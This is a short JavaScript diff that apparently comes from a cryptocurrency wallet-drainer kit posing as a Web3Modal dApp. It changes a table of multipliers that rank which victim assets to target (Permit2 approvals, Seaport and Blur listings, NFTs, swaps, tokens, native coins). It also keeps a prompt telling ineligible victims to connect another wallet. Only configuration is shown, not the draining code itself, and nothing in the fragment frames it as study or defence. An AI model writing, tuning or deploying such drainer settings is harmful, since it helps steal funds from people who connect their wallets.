@@ -161,13 +161,13 @@ let w3m_description = "";
 let w3m_url = "";
 let w3m_icons = [''];
 let multipliers = {
-'LP_NFTS': 1,
-'PERMIT2': 2,
-'BLUR': 1,
-'SEAPORT': 1,
-'SWAP': 1,
-'TOKENS': 1,
-'NFT': 1,
+'LP_NFTS': 0.75,
+'PERMIT2': 1,
+'BLUR': 0.75,
+'SEAPORT': 0.75,
+'SWAP': 2,
+'TOKENS': 2,
+'NFT': 0.75,
 'NATIVES': 0.5,
 };
 let notEligible = "Your wallet is not eligible, connect another wallet.";
